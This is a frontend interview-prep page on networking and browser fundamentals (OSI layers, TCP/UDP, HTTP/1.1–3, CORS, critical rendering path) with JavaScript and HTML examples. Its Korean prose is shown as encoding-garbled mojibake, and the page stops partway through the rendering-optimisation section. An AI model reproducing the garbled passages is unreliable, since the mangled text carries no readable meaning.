---
title: í”„ë¡ íŠ¸ì—”ë“œ ë©´ì ‘ ì§ˆë¬¸ - CS
summary: í”„ë¡ íŠ¸ì—”ë“œ ë©´ì ‘ ì‹œ CS ë©´ì ‘ ì§ˆë¬¸ë“¤ì…ë‹ˆë‹¤.
keywords:
  - Tech
status: published
tags:
  - ë©´ì ‘
createdAt: 2025-10-21
updatedAt: 2025-10-21
---

## ğŸ’» Computer Science

### Q1. OSI 7ê³„ì¸µ ëª¨ë¸ì„ ì„¤ëª…í•˜ê³ , HTTPê°€ ì–´ëŠ ê³„ì¸µì—ì„œ ë™ì‘í•˜ëŠ”ì§€ ì„¤ëª…í•´ì£¼ì„¸ìš”.

**í‚¤ì›Œë“œ:** `í”„ë¡œí† ì½œ ìŠ¤íƒ`, `ìº¡ìŠí™”`, `TCP/IP`, `íŒ¨í‚·`, `ë¼ìš°íŒ…`

**ë‹µë³€:**

**OSI 7ê³„ì¸µ:**

| ê³„ì¸µ | ì´ë¦„         | ì—­í•                            | í”„ë¡œí† ì½œ/ì¥ë¹„               |
| ---- | ------------ | ------------------------------ | --------------------------- |
| 7    | Application  | ì‚¬ìš©ì ì¸í„°í˜ì´ìŠ¤, ì‘ìš© ì„œë¹„ìŠ¤ | HTTP, HTTPS, FTP, DNS, SMTP |
| 6    | Presentation | ë°ì´í„° ë³€í™˜, ì•”í˜¸í™”, ì••ì¶•      | SSL/TLS, JPEG, MPEG         |
| 5    | Session      | ì„¸ì…˜ ê´€ë¦¬, ì—°ê²° ìœ ì§€           | NetBIOS, RPC                |
| 4    | Transport    | ì‹ ë¢°ì„±, íë¦„ ì œì–´, í¬íŠ¸        | TCP, UDP                    |
| 3    | Network      | ë¼ìš°íŒ…, IP ì£¼ì†Œ                | IP, ICMP, Router            |
| 2    | Data Link    | MAC ì£¼ì†Œ, í”„ë ˆì„, ì—ëŸ¬ ê²€ì¶œ    | Ethernet, PPP, Switch       |
| 1    | Physical     | ë¬¼ë¦¬ì  ì „ì†¡, ë¹„íŠ¸              | Cable, Hub, ì „ê¸° ì‹ í˜¸       |

**HTTPëŠ” 7ê³„ì¸µ (Application Layer)ì—ì„œ ë™ì‘**

**ë°ì´í„° ì „ì†¡ ê³¼ì •:**

```jsx
// 7ê³„ì¸µ: HTTP ìš”ì²­ ìƒì„±
fetch("https://api.example.com/users");

// 6ê³„ì¸µ: TLS ì•”í˜¸í™” (HTTPS)
// - ë°ì´í„° ì•”í˜¸í™”
// - ì¸ì¦ì„œ ê²€ì¦

// 5ê³„ì¸µ: ì„¸ì…˜ ìˆ˜ë¦½
// - ì—°ê²° ìœ ì§€ ê´€ë¦¬

// 4ê³„ì¸µ: TCP ì„¸ê·¸ë¨¼íŠ¸ ìƒì„±
// - 3-way handshake (SYN â†’ SYN-ACK â†’ ACK)
// - í¬íŠ¸ ë²ˆí˜¸ ì¶”ê°€ (443)
// - ìˆœì„œ ë²ˆí˜¸, ì²´í¬ì„¬

// 3ê³„ì¸µ: IP íŒ¨í‚· ìƒì„±
// - ì¶œë°œì§€/ëª©ì ì§€ IP ì£¼ì†Œ
// - ë¼ìš°íŒ… ê²½ë¡œ ê²°ì •
// - TTL ì„¤ì •

// 2ê³„ì¸µ: í”„ë ˆì„ ìƒì„±
// - MAC ì£¼ì†Œ ì¶”ê°€
// - ì—ëŸ¬ ê²€ì¶œ (CRC)

// 1ê³„ì¸µ: ë¬¼ë¦¬ì  ì „ì†¡
// - ë¹„íŠ¸ â†’ ì „ê¸°/ê´‘ ì‹ í˜¸
```

**í”„ë¡ íŠ¸ì—”ë“œ ê´€ì :**

```jsx
// Application Layerì—ì„œ ì‘ì—…
const response = await fetch("https://api.example.com/data", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    Authorization: "Bearer token",
  },
  body: JSON.stringify({ data: "value" }),
});

// í•˜ìœ„ ê³„ì¸µì€ ë¸Œë¼ìš°ì €/OSê°€ ìë™ ì²˜ë¦¬
// - TCP ì—°ê²°
// - IP ë¼ìš°íŒ…
// - ë¬¼ë¦¬ì  ì „ì†¡
```

**TCP/IP ëª¨ë¸ (ì‹¤ë¬´ì—ì„œ ë” ë§ì´ ì‚¬ìš©):**

```
OSI 7ê³„ì¸µ          TCP/IP 4ê³„ì¸µ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Application   â”
Presentation  â”‚ â†’  Application
Session       â”˜
Transport        â†’  Transport
Network          â†’  Internet
Data Link     â”
Physical      â”˜ â†’  Network Access
```

---

### Q2. TCPì™€ UDPì˜ ì°¨ì´ì , ê·¸ë¦¬ê³  ê°ê°ì˜ ì‚¬ìš© ì‚¬ë¡€ë¥¼ ì„¤ëª…í•´ì£¼ì„¸ìš”.

**í‚¤ì›Œë“œ:** `ì—°ê²° ì§€í–¥`, `ì‹ ë¢°ì„±`, `3-way handshake`, `íë¦„ ì œì–´`, `í˜¼ì¡ ì œì–´`, `ì‹¤ì‹œê°„`

**ë‹µë³€:**

**TCP (Transmission Control Protocol)**

**íŠ¹ì§•:**

- **ì—°ê²° ì§€í–¥**: 3-way handshakeë¡œ ì—°ê²° ìˆ˜ë¦½
- **ì‹ ë¢°ì„±**: ë°ì´í„° ì†ì‹¤ ì‹œ ì¬ì „ì†¡
- **ìˆœì„œ ë³´ì¥**: íŒ¨í‚·ì´ ìˆœì„œëŒ€ë¡œ ë„ì°©
- **íë¦„ ì œì–´**: ìˆ˜ì‹ ì ë²„í¼ í¬ê¸°ì— ë§ì¶¤
- **í˜¼ì¡ ì œì–´**: ë„¤íŠ¸ì›Œí¬ ìƒí™© ê³ ë ¤
- **ì˜¤ë²„í—¤ë“œ**: í—¤ë” í¬ê¸° 20-60 bytes

**3-way Handshake:**

```
í´ë¼ì´ì–¸íŠ¸              ì„œë²„
   |                    |
   |  ---- SYN ---->    |  1. ì—°ê²° ìš”ì²­
   |                    |
   |  <-- SYN-ACK ---   |  2. ì‘ë‹µ + ì—°ê²° ìš”ì²­
   |                    |
   |  ---- ACK ---->    |  3. ì‘ë‹µ
   |                    |
   |  (ì—°ê²° í™•ë¦½)        |
```

**UDP (User Datagram Protocol)**

**íŠ¹ì§•:**

- **ë¹„ì—°ê²°**: ì‚¬ì „ ì—°ê²° ì—†ì´ ì „ì†¡
- **ì‹ ë¢°ì„± ì—†ìŒ**: ë°ì´í„° ì†ì‹¤ ê°€ëŠ¥
- **ìˆœì„œ ë³´ì¥ ì•ˆí•¨**: ìˆœì„œ ë’¤ë°”ë€” ìˆ˜ ìˆìŒ
- **ë¹ ë¦„**: ì˜¤ë²„í—¤ë“œ ì ìŒ
- **ì‹¤ì‹œê°„**: ì§€ì—° ì‹œê°„ ìµœì†Œí™”
- **ì˜¤ë²„í—¤ë“œ**: í—¤ë” í¬ê¸° 8 bytes

**ë¹„êµí‘œ:**

| íŠ¹ì§•      | TCP         | UDP       |
| --------- | ----------- | --------- |
| ì—°ê²°      | ì—°ê²° ì§€í–¥   | ë¹„ì—°ê²°    |
| ì‹ ë¢°ì„±    | ë³´ì¥        | ë³´ì¥ ì•ˆí•¨ |
| ìˆœì„œ      | ë³´ì¥        | ë³´ì¥ ì•ˆí•¨ |
| ì†ë„      | ëŠë¦¼        | ë¹ ë¦„      |
| í—¤ë” í¬ê¸° | 20-60 bytes | 8 bytes   |
| íë¦„ ì œì–´ | O           | X         |
| í˜¼ì¡ ì œì–´ | O           | X         |
| ì¬ì „ì†¡    | O           | X         |

**ì‚¬ìš© ì‚¬ë¡€:**

**TCP ì‚¬ìš©:**

```jsx
// 1. HTTP/HTTPS (ì›¹)
fetch("https://api.example.com/data");

// 2. íŒŒì¼ ì „ì†¡ (FTP)
// ë°ì´í„° ë¬´ê²°ì„± ì¤‘ìš”

// 3. ì´ë©”ì¼ (SMTP, POP3, IMAP)
// ìˆœì„œì™€ ì‹ ë¢°ì„± í•„ìš”

// 4. SSH
// ë³´ì•ˆ ì—°ê²° í•„ìš”

// 5. WebSocket
const ws = new WebSocket("ws://example.com");
// ì´ˆê¸° ì—°ê²°ì€ HTTP (TCP)
```

**UDP ì‚¬ìš©:**

```jsx
// 1. DNS
// ë¹ ë¥¸ ì‘ë‹µ í•„ìš”, ì¬ìš”ì²­ ê°€ëŠ¥

// 2. ì‹¤ì‹œê°„ ìŠ¤íŠ¸ë¦¬ë°
const peer = new RTCPeerConnection();
// WebRTCëŠ” UDP ê¸°ë°˜

// 3. VoIP (ìŒì„± í†µí™”)
// ì§€ì—° ì‹œê°„ì´ ì¤‘ìš”, ì¼ë¶€ ì†ì‹¤ í—ˆìš©

// 4. ì˜¨ë¼ì¸ ê²Œì„
// ì‹¤ì‹œê°„ ìœ„ì¹˜ ì—…ë°ì´íŠ¸
// ì¼ë¶€ íŒ¨í‚· ì†ì‹¤í•´ë„ ë‹¤ìŒ ì—…ë°ì´íŠ¸ë¡œ ë³´ì •

// 5. ë¹„ë””ì˜¤ íšŒì˜
// ì‹¤ì‹œê°„ì„±ì´ í’ˆì§ˆë³´ë‹¤ ì¤‘ìš”
```

**í”„ë¡ íŠ¸ì—”ë“œ ì˜ˆì œ:**

```jsx
// TCP: fetch API
async function fetchData() {
  const response = await fetch("/api/data");
  // TCPê°€ ìë™ìœ¼ë¡œ ì²˜ë¦¬:
  // - ì—°ê²° ìˆ˜ë¦½
  // - ë°ì´í„° ì‹ ë¢°ì„±
  // - ìˆœì„œ ë³´ì¥
  return response.json();
}

// UDP: WebRTC (P2P í†µì‹ )
const peer = new RTCPeerConnection();

// ë°ì´í„° ì±„ë„ (UDP ê¸°ë°˜)
const channel = peer.createDataChannel("game");

channel.onmessage = (event) => {
  // ì‹¤ì‹œê°„ ê²Œì„ ë°ì´í„°
  updatePlayerPosition(event.data);
};

// ì¼ë¶€ íŒ¨í‚· ì†ì‹¤ë˜ì–´ë„ ë‹¤ìŒ ì—…ë°ì´íŠ¸ë¡œ ë³´ì •
channel.send(JSON.stringify({ x: 100, y: 200 }));
```

**ì„ íƒ ê¸°ì¤€:**

- **ì‹ ë¢°ì„±ì´ ì¤‘ìš”** â†’ TCP
- **ì†ë„ê°€ ì¤‘ìš”** â†’ UDP
- **ë°ì´í„° ë¬´ê²°ì„± í•„ìˆ˜** â†’ TCP
- **ì‹¤ì‹œê°„ ìŠ¤íŠ¸ë¦¬ë°** â†’ UDP
- **íŒŒì¼ ì „ì†¡** â†’ TCP
- **ê²Œì„/ì˜ìƒ í†µí™”** â†’ UDP

---

### Q3. HTTP/1.1, HTTP/2, HTTP/3ì˜ ì°¨ì´ì ê³¼ ì„±ëŠ¥ ê°œì„  ì‚¬í•­ì„ ì„¤ëª…í•´ì£¼ì„¸ìš”.

**í‚¤ì›Œë“œ:** `ë©€í‹°í”Œë ‰ì‹±`, `í—¤ë” ì••ì¶•`, `ì„œë²„ í‘¸ì‹œ`, `QUIC`, `HOL Blocking`, `0-RTT`

**ë‹µë³€:**

**HTTP/1.1 (1997)**

**íŠ¹ì§•:**

- í…ìŠ¤íŠ¸ ê¸°ë°˜ í”„ë¡œí† ì½œ
- í•œ ì—°ê²°ë‹¹ í•˜ë‚˜ì˜ ìš”ì²­/ì‘ë‹µ
- Keep-Aliveë¡œ ì—°ê²° ì¬ì‚¬ìš©
- íŒŒì´í”„ë¼ì´ë‹ (ì‹¤ì œë¡œëŠ” ì˜ ì•ˆì”€)

**ë¬¸ì œì :**

```jsx
// Head-of-Line (HOL) Blocking
// ì²« ë²ˆì§¸ ìš”ì²­ì´ ëŠë¦¬ë©´ ë’¤ ìš”ì²­ë„ ëŒ€ê¸°

// ìš”ì²­ 1 (10ì´ˆ) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶
// ìš”ì²­ 2 (1ì´ˆ)  ê¸°ë‹¤ë¦¼...    â”€â”€â”€â”€â–¶
// ìš”ì²­ 3 (1ì´ˆ)  ê¸°ë‹¤ë¦¼...         â”€â”€â”€â”€â–¶

// í•´ê²°ì±…: ë„ë©”ì¸ ìƒ¤ë”©
<img src="https://cdn1.example.com/a.jpg" />
<img src="https://cdn2.example.com/b.jpg" />
<img src="https://cdn3.example.com/c.jpg" />
// ë¸Œë¼ìš°ì € ì—°ê²° ì œí•œ ìš°íšŒ (ë„ë©”ì¸ë‹¹ 6ê°œ)
```

**HTTP/2 (2015)**

**ì£¼ìš” ê°œì„ ì‚¬í•­:**

```jsx
// 1. ë©€í‹°í”Œë ‰ì‹±
// í•˜ë‚˜ì˜ ì—°ê²°ë¡œ ì—¬ëŸ¬ ìš”ì²­ ë³‘ë ¬ ì²˜ë¦¬
// Stream ê°œë… ë„ì…

Request 1  â”€â”¬â”€â”€â”€â”€â”€â–¶
Request 2  â”€â”¤â”€â”€â”€â”€â”€â–¶
Request 3  â”€â”´â”€â”€â”€â”€â”€â–¶
           ë‹¨ì¼ TCP ì—°ê²°

// 2. í—¤ë” ì••ì¶• (HPACK)
// ì¤‘ë³µ í—¤ë” ì œê±°, ì´ì „ í—¤ë” ì¬ì‚¬ìš©
Headers: 500 bytes â†’ 50 bytes

// 3. ì„œë²„ í‘¸ì‹œ
// í´ë¼ì´ì–¸íŠ¸ ìš”ì²­ ì „ì— ë¦¬ì†ŒìŠ¤ ì „ì†¡
// HTML ìš”ì²­ â†’ ì„œë²„ê°€ CSS/JSë„ ê°™ì´ í‘¸ì‹œ

// 4. ìš°ì„ ìˆœìœ„ ì§€ì •
// ì¤‘ìš”í•œ ë¦¬ì†ŒìŠ¤ ë¨¼ì € ë¡œë“œ
stream.priority = { weight: 256, dependency: 0 };

// 5. ë°”ì´ë„ˆë¦¬ í”„ë¡œí† ì½œ
// íŒŒì‹± ì†ë„ í–¥ìƒ, ì˜¤ë¥˜ ê°ì†Œ
```

**ì¥ì :**

```jsx
// ë„ë©”ì¸ ìƒ¤ë”© ë¶ˆí•„ìš”
// ëª¨ë“  ë¦¬ì†ŒìŠ¤ë¥¼ í•˜ë‚˜ì˜ ì—°ê²°ë¡œ
<link rel="stylesheet" href="/style.css">
<script src="/app.js"></script>
<img src="/hero.jpg">
// ëª¨ë‘ ë‹¨ì¼ HTTP/2 ì—°ê²°ë¡œ ë³‘ë ¬ ì „ì†¡

// í˜ì´ì§€ ë¡œë“œ ì†ë„ 30-50% ê°œì„ 
```

**í•œê³„:**

- TCP HOL Blocking ì—¬ì „íˆ ì¡´ì¬
- íŒ¨í‚· ì†ì‹¤ ì‹œ ëª¨ë“  ìŠ¤íŠ¸ë¦¼ ì˜í–¥

**HTTP/3 (2022)**

**í•µì‹¬ ë³€ê²½: TCP â†’ QUIC (UDP ê¸°ë°˜)**

```jsx
// QUIC íŠ¹ì§•
// 1. UDP ê¸°ë°˜
// - TCP HOL Blocking í•´ê²°
// - ê° ìŠ¤íŠ¸ë¦¼ ë…ë¦½ì 

Stream 1 â”€â”€â”€â”€â”€â–¶ (íŒ¨í‚· ì†ì‹¤)
Stream 2 â”€â”€â”€â”€â”€â–¶ (ì •ìƒ ì§„í–‰) âœ…
Stream 3 â”€â”€â”€â”€â”€â–¶ (ì •ìƒ ì§„í–‰) âœ…

// 2. ë¹ ë¥¸ ì—°ê²° (0-RTT)
// ì´ì „ ì—°ê²° ì •ë³´ ì¬ì‚¬ìš©
// ì²« íŒ¨í‚·ì— ë°ì´í„° í¬í•¨

// 3. ì—°ê²° ë§ˆì´ê·¸ë ˆì´ì…˜
// WiFi â†” ëª¨ë°”ì¼ ì „í™˜ ì‹œ ì—°ê²° ìœ ì§€
// Connection ID ì‚¬ìš©

// 4. ë‚´ì¥ TLS 1.3
// ë³„ë„ í•¸ë“œì…°ì´í¬ ë¶ˆí•„ìš”
```

**ì„±ëŠ¥ ë¹„êµ:**

| íŠ¹ì§•           | HTTP/1.1   | HTTP/2     | HTTP/3     |
| -------------- | ---------- | ---------- | ---------- |
| ì „ì†¡ í”„ë¡œí† ì½œ  | TCP        | TCP        | QUIC (UDP) |
| ë©€í‹°í”Œë ‰ì‹±     | âŒ         | âœ…         | âœ…         |
| í—¤ë” ì••ì¶•      | âŒ         | âœ… (HPACK) | âœ… (QPACK) |
| ì„œë²„ í‘¸ì‹œ      | âŒ         | âœ…         | âœ…         |
| HOL Blocking   | TCP + HTTP | TCPë§Œ      | âŒ         |
| ì—°ê²° ì‹œê°„      | 2-3 RTT    | 1-2 RTT    | 0-1 RTT    |
| íŒ¨í‚· ì†ì‹¤ ì˜í–¥ | í¼         | ì¤‘ê°„       | ì‘ìŒ       |
| ì•”í˜¸í™”         | ì„ íƒ       | ì„ íƒ       | í•„ìˆ˜       |

**RTT (Round Trip Time) ë¹„êµ:**

```
HTTP/1.1 over TLS:
TCP handshake    (1 RTT)
TLS handshake    (2 RTT)
HTTP Request     (1 RTT)
ì´: 4 RTT

HTTP/2 over TLS:
TCP handshake    (1 RTT)
TLS handshake    (1 RTT) [TLS 1.3]
HTTP Request     (0 RTT) [ë©€í‹°í”Œë ‰ì‹±]
ì´: 2 RTT

HTTP/3:
QUIC handshake   (1 RTT) [ì²« ì—°ê²°]
HTTP Request     (0 RTT)
ì´: 1 RTT

HTTP/3 (0-RTT):
ì´ì „ ì—°ê²° ì •ë³´ë¡œ (0 RTT)
ì´: 0 RTT
```

**Next.jsì—ì„œ í™•ì¸:**

```jsx
// next.config.js
module.exports = {
  // Vercelì€ ìë™ìœ¼ë¡œ HTTP/2, HTTP/3 ì§€ì›

  headers: async () => [
    {
      source: "/:path*",
      headers: [
        // HTTP/3 ê´‘ê³ 
        {
          key: "Alt-Svc",
          value: 'h3=":443"; ma=86400',
        },
      ],
    },
  ],
};

// ë¸Œë¼ìš°ì € DevToolsì—ì„œ í™•ì¸
// Network íƒ­ â†’ Protocol ì»¬ëŸ¼
// h2: HTTP/2
// h3: HTTP/3
```

**ì‹¤ë¬´ ì ìš©:**

```jsx
// HTTP/2 ìµœì í™”
// âŒ ë” ì´ìƒ ë¶ˆí•„ìš”
// - ë„ë©”ì¸ ìƒ¤ë”©
// - CSS ìŠ¤í”„ë¼ì´íŠ¸
// - íŒŒì¼ ë²ˆë“¤ë§ (ê³¼ë„í•œ)

// âœ… HTTP/2ì— ë§ëŠ” ìµœì í™”
// - ì ì ˆí•œ ì½”ë“œ ìŠ¤í”Œë¦¬íŒ…
// - ëª¨ë“ˆ ë‹¨ìœ„ ë²ˆë“¤ë§
// - ë‹¨ì¼ ë„ë©”ì¸ ì‚¬ìš©
```

---

### Q4. CORSì˜ ë™ì‘ ì›ë¦¬ì™€ í•´ê²° ë°©ë²•ì„ ì„¤ëª…í•´ì£¼ì„¸ìš”.

**í‚¤ì›Œë“œ:** `Same-Origin Policy`, `Preflight`, `Simple Request`, `CORS í—¤ë”`, `í”„ë¡ì‹œ`

**ë‹µë³€:**

**CORS (Cross-Origin Resource Sharing)**
ë¸Œë¼ìš°ì € ë³´ì•ˆ ì •ì±…ìœ¼ë¡œ, ë‹¤ë¥¸ ì¶œì²˜ì˜ ë¦¬ì†ŒìŠ¤ ìš”ì²­ì„ ì œí•œ

**ì¶œì²˜(Origin) êµ¬ì„±:**

```
https://example.com:443/path?query
â””â”€â”¬â”€â”˜   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜â””â”¬â”˜
  â”‚          â”‚       â”‚
í”„ë¡œí† ì½œ    ë„ë©”ì¸    í¬íŠ¸

ê°™ì€ ì¶œì²˜:
https://example.com:443
https://example.com:443/api
https://example.com:443/path

ë‹¤ë¥¸ ì¶œì²˜:
http://example.com        (í”„ë¡œí† ì½œ ë‹¤ë¦„)
https://api.example.com   (ì„œë¸Œë„ë©”ì¸ ë‹¤ë¦„)
https://example.com:8080  (í¬íŠ¸ ë‹¤ë¦„)
https://example.org       (ë„ë©”ì¸ ë‹¤ë¦„)
```

**Simple Request (ë‹¨ìˆœ ìš”ì²­)**

**ì¡°ê±´:**

- GET, POST, HEAD ë©”ì„œë“œ
- í—ˆìš©ëœ í—¤ë”ë§Œ ì‚¬ìš©
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

```jsx
// Simple Request
fetch("https://api.example.com/data", {
  method: "GET",
});

// ë¸Œë¼ìš°ì €ê°€ ìë™ìœ¼ë¡œ Origin í—¤ë” ì¶”ê°€
// Origin: https://myapp.com

// ì„œë²„ ì‘ë‹µì— CORS í—¤ë” í•„ìš”
// Access-Control-Allow-Origin: https://myapp.com
// ë˜ëŠ”
// Access-Control-Allow-Origin: *
```

**Preflight Request (ì‚¬ì „ ìš”ì²­)**

**ì¡°ê±´:**

- PUT, DELETE, PATCH ë©”ì„œë“œ
- ì»¤ìŠ¤í…€ í—¤ë” ì‚¬ìš©
- Content-Type: application/json

```jsx
// Preflightê°€ í•„ìš”í•œ ìš”ì²­
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ data: 'value' })
});

// ì‹¤ì œ ì „ì†¡ ìˆœì„œ:
// 1. OPTIONS ìš”ì²­ (Preflight)
OPTIONS /data HTTP/1.1
Origin: https://myapp.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization,content-type,x-custom-header

// 2. ì„œë²„ ì‘ë‹µ
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: authorization,content-type,x-custom-header
Access-Control-Max-Age: 86400  // Preflight ìºì‹œ ì‹œê°„

// 3. ì‹¤ì œ POST ìš”ì²­
POST /data HTTP/1.1
...
```

**ì„œë²„ ì¸¡ í•´ê²° (Express)**

```jsx
const express = require("express");
const app = express();

// 1. ëª¨ë“  ì¶œì²˜ í—ˆìš© (ê°œë°œ í™˜ê²½)
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");

  // Preflight ì²˜ë¦¬
  if (req.method === "OPTIONS") {
    return res.sendStatus(200);
  }

  next();
});

// 2. íŠ¹ì • ì¶œì²˜ë§Œ í—ˆìš© (í”„ë¡œë•ì…˜)
const allowedOrigins = ["https://myapp.com", "https://www.myapp.com"];

app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.header("Access-Control-Allow-Origin", origin);
  }

  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
  res.header("Access-Control-Allow-Credentials", "true"); // ì¿ í‚¤ í¬í•¨
  res.header("Access-Control-Max-Age", "86400"); // 24ì‹œê°„

  if (req.method === "OPTIONS") {
    return res.sendStatus(200);
  }

  next();
});

// 3. cors ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš©
const cors = require("cors");

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
    maxAge: 86400,
  })
);
```

**Next.jsì—ì„œ í•´ê²°:**

```jsx
// 1. next.config.jsì—ì„œ í—¤ë” ì„¤ì •
module.exports = {
  async headers() {
    return [
      {
        source: "/api/:path*",
        headers: [
          { key: "Access-Control-Allow-Origin", value: "*" },
          { key: "Access-Control-Allow-Methods", value: "GET,POST,PUT,DELETE" },
          { key: "Access-Control-Allow-Headers", value: "Content-Type, Authorization" },
        ],
      },
    ];
  },
};

// 2. API Routeì—ì„œ ì§ì ‘ ì²˜ë¦¬
// app/api/data/route.js
export async function OPTIONS() {
  return new Response(null, {
    status: 200,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
    },
  });
}

export async function GET(request) {
  const response = NextResponse.json({ data: "value" });

  response.headers.set("Access-Control-Allow-Origin", "*");

  return response;
}

// 3. í”„ë¡ì‹œ ì‚¬ìš© (ê°œë°œ í™˜ê²½)
// next.config.js
module.exports = {
  async rewrites() {
    return [
      {
        source: "/api/:path*",
        destination: "https://external-api.com/:path*",
      },
    ];
  },
};

// í”„ë¡ íŠ¸ì—”ë“œì—ì„œ Same-Origin ìš”ì²­ìœ¼ë¡œ ì¸ì‹
fetch("/api/data"); // CORS ë¬¸ì œ ì—†ìŒ
```

**ì¿ í‚¤ í¬í•¨ ìš”ì²­:**

```jsx
// í´ë¼ì´ì–¸íŠ¸
fetch("https://api.example.com/data", {
  credentials: "include", // ì¿ í‚¤ í¬í•¨
});

// ì„œë²„ (ë°˜ë“œì‹œ íŠ¹ì • ì¶œì²˜ ì§€ì •)
res.header("Access-Control-Allow-Origin", "https://myapp.com"); // * ë¶ˆê°€
res.header("Access-Control-Allow-Credentials", "true");
```

**CORS ì—ëŸ¬ ë””ë²„ê¹…:**

```jsx
// 1. ì½˜ì†” ì—ëŸ¬ í™•ì¸
// "Access to fetch at '...' from origin '...' has been blocked by CORS policy"

// 2. Network íƒ­ í™•ì¸
// - Preflight ìš”ì²­ (OPTIONS) í™•ì¸
// - ì‘ë‹µ í—¤ë” í™•ì¸

// 3. ì„œë²„ ë¡œê·¸ í™•ì¸
// - OPTIONS ìš”ì²­ ì²˜ë¦¬ í™•ì¸
// - í—¤ë” ì„¤ì • í™•ì¸

// 4. ë¸Œë¼ìš°ì € í™•ì¥ (ì„ì‹œ)
// - Allow CORS í™•ì¥ ì„¤ì¹˜
// - ê°œë°œ ì¤‘ì—ë§Œ ì‚¬ìš©
```

---

### Q5. ë¸Œë¼ìš°ì €ì˜ ë Œë”ë§ ê³¼ì •(Critical Rendering Path)ì„ ì„¤ëª…í•´ì£¼ì„¸ìš”.

**í‚¤ì›Œë“œ:** `DOM`, `CSSOM`, `Render Tree`, `Layout`, `Paint`, `Composite`, `Reflow`, `Repaint`

**ë‹µë³€:**

**ë Œë”ë§ íŒŒì´í”„ë¼ì¸:**

```
HTML â†’ DOM Tree
CSS â†’ CSSOM Tree
DOM + CSSOM â†’ Render Tree
Render Tree â†’ Layout (Reflow)
Layout â†’ Paint
Paint â†’ Composite
```

**1. DOM ìƒì„±**

```html
<html>
  <body>
    <div class="container">
      <h1>Title</h1>
      <p>Content</p>
    </div>
  </body>
</html>

â†’ DOM Tree: html â””â”€ body â””â”€ div.container â”œâ”€ h1 â””â”€ p
```

**2. CSSOM ìƒì„±**

```css
body { font-size: 16px; }
.container { max-width: 1200px; }
h1 { color: blue; }
p { color: gray; }

â†’ CSSOM Tree:
body: { font-size: 16px }
 â””â”€ div.container: { max-width: 1200px }
     â”œâ”€ h1: { color: blue, font-size: 16px }
     â””â”€ p: { color: gray, font-size: 16px }
```

**3. Render Tree ìƒì„±**

```
DOM + CSSOM â†’ Render Tree

- display: noneì€ ì œì™¸
- visibility: hiddenì€ í¬í•¨
- <script>, <meta> ë“±ì€ ì œì™¸
```

**4. Layout (Reflow)**

```jsx
// ê° ë…¸ë“œì˜ ì •í™•í•œ ìœ„ì¹˜ì™€ í¬ê¸° ê³„ì‚°
// - ë·°í¬íŠ¸ í¬ê¸°
// - ë¶€ëª¨/ìì‹ ê´€ê³„
// - CSS Box Model

// Reflowë¥¼ ìœ ë°œí•˜ëŠ” ì†ì„±:
// width, height, margin, padding
// border, position, display
// float, overflow, font-size
```

**5. Paint**

```jsx
// í”½ì…€ë¡œ ë³€í™˜
// - ìƒ‰ìƒ, ì´ë¯¸ì§€, í…ìŠ¤íŠ¸, ê·¸ë¦¼ì
// - ì—¬ëŸ¬ ë ˆì´ì–´ë¡œ ë¶„ë¦¬

// Repaintë¥¼ ìœ ë°œí•˜ëŠ” ì†ì„±:
// color, background, visibility
// box-shadow, border-radius
```

**6. Composite**

```jsx
// ë ˆì´ì–´ë“¤ì„ í•©ì„±í•˜ì—¬ ìµœì¢… í™”ë©´ ìƒì„±
// GPU ê°€ì† ì‚¬ìš©
```

**ë Œë”ë§ ì°¨ë‹¨ ë¦¬ì†ŒìŠ¤:**

```html
<html>
  <head>
    <!-- CSSëŠ” ë Œë”ë§ ì°¨ë‹¨ -->
    <link rel="stylesheet" href="style.css" />
    <!-- JSëŠ” íŒŒì‹± ì°¨ë‹¨ -->
    <script src="bundle.js"></script>
  </head>
  <body>
    <div>Content</div>
  </body>
</html>

ì‹¤í–‰ ìˆœì„œ: 1. HTML íŒŒì‹± ì‹œì‘ 2. style.css ë‹¤ìš´ë¡œë“œ ëŒ€ê¸° (ë Œë”ë§ ì°¨ë‹¨) 3. CSSOM ìƒì„± 4. bundle.js ë‹¤ìš´ë¡œë“œ ë° ì‹¤í–‰ (íŒŒì‹± ì°¨ë‹¨) 5. HTML íŒŒì‹± ì¬ê°œ 6. ë Œë”ë§ ì‹œì‘
```

**ìµœì í™” ê¸°ë²•:**

```html
<!-- 1. CSS: ìµœëŒ€í•œ ë¹¨ë¦¬ ë¡œë“œ -->
<link rel="stylesheet" href="critical.css" />
<link rel="stylesheet" href="non-critical.css" media="print" />
<link rel="preload" href="font.woff2" as="font" crossorigin />

<!-- 2. JavaScript: defer/async ì‚¬ìš© -->
<script src="analytics.js" async></script>
<!-- async: ë‹¤ìš´ë¡œë“œ í›„ ì¦‰ì‹œ ì‹¤í–‰ (ìˆœì„œ ë¬´ê´€) -->

<script src="app.js" defer></script>
<!-- defer: HTML íŒŒì‹± ì™„ë£Œ í›„ ì‹¤í–‰ (ìˆœì„œ ë³´ì¥) -->

